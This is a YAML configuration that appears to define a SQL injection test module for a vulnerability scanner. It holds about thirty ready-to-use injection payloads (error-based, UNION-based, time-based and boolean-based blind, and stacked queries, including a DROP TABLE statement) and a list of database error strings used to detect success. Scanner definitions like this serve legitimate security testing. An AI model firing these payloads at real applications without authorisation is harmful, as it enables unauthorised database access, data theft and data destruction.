name: "SQL Injection"
category: "sqli"
severity: "critical"
payloads:
  # Error-based
  - value: "'"
    detection: "error_based"
  - value: "''"
    detection: "error_based"
  - value: "' OR '1'='1"
    detection: "error_based"
  - value: "' OR '1'='1'--"
    detection: "error_based"
  - value: "' OR '1'='1'/*"
    detection: "error_based"
  - value: "\" OR \"1\"=\"1"
    detection: "error_based"
  - value: "1' AND '1'='1"
    detection: "error_based"
  - value: "1' AND '1'='2"
    detection: "error_based"
  - value: "') OR ('1'='1"
    detection: "error_based"
  - value: "')) OR (('1'='1"
    detection: "error_based"
  - value: "1 OR 1=1"
    detection: "error_based"
  - value: "1' OR '1'='1' #"
    detection: "error_based"
  - value: "admin'--"
    detection: "error_based"

  # Union-based
  - value: "' UNION SELECT NULL--"
    detection: "union_based"
  - value: "' UNION SELECT NULL,NULL--"
    detection: "union_based"
  - value: "' UNION SELECT NULL,NULL,NULL--"
    detection: "union_based"
  - value: "' UNION SELECT 1,2,3--"
    detection: "union_based"
  - value: "' UNION ALL SELECT 1,@@version,3--"
    detection: "union_based"
  - value: "1' ORDER BY 1--"
    detection: "union_based"
  - value: "1' ORDER BY 10--"
    detection: "union_based"
  - value: "1' ORDER BY 100--"
    detection: "union_based"

  # Time-based blind
  - value: "' AND SLEEP(5)--"
    detection: "time_based"
  - value: "1' AND SLEEP(5)--"
    detection: "time_based"
  - value: "'; WAITFOR DELAY '0:0:5'--"
    detection: "time_based"
  - value: "1; WAITFOR DELAY '0:0:5'--"
    detection: "time_based"
  - value: "' AND pg_sleep(5)--"
    detection: "time_based"
  - value: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    detection: "time_based"

  # Boolean-based blind
  - value: "' AND 1=1--"
    detection: "boolean_based"
  - value: "' AND 1=2--"
    detection: "boolean_based"
  - value: "' AND SUBSTRING(@@version,1,1)='5'--"
    detection: "boolean_based"
  - value: "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    detection: "boolean_based"

  # Stacked queries
  - value: "'; DROP TABLE test--"
    detection: "error_based"
  - value: "1; SELECT 1--"
    detection: "error_based"

indicators:
  - "SQL syntax"
  - "mysql_fetch"
  - "mysql_num_rows"
  - "mysql_query"
  - "pg_query"
  - "pg_exec"
  - "ORA-01756"
  - "ORA-00933"
  - "ORA-00921"
  - "SQLite3::"
  - "sqlite_error"
  - "SQLITE_ERROR"
  - "Microsoft OLE DB"
  - "ODBC SQL Server"
  - "ODBC Microsoft Access"
  - "JET Database Engine"
  - "mssql_query"
  - "Unclosed quotation mark"
  - "quoted string not properly terminated"
  - "You have an error in your SQL syntax"
  - "supplied argument is not a valid MySQL"
  - "unterminated quoted string"
  - "PostgreSQL"
  - "invalid input syntax for"
  - "syntax error at or near"
  - "ERROR: parser:"
  - "DB2 SQL error"
  - "SQLCODE"
  - "SQLSTATE"
  - "Sybase message"
  - "Informix ODBC"
  - "DriverSapDB"
  - "com.sap.dbtech"
